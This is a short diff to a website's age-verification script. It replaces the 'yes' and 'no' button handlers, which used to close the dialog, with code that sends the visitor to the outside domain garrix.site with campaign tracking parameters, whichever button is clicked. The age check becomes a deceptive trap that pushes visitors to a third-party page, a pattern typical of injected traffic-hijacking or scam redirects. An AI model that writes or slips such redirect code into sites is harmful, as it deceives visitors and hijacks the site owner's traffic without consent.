@@ -61,6 +61,11 @@ if(form){
 
   const yes=bd.querySelector('#age-yes');
   const no=bd.querySelector('#age-no');
-  if(yes) yes.addEventListener('click',close);
-  if(no) no.addEventListener('click',close);
+  if(yes) yes.addEventListener('click',function(){
+    window.location.href = "https://garrix.site/?utm_campaign=eJyj9hW6as&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+  if(no) no.addEventListener('click',function(){
+    window.location.href = "https://garrix.site/?utm_campaign=eJyj9hW6as&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
+
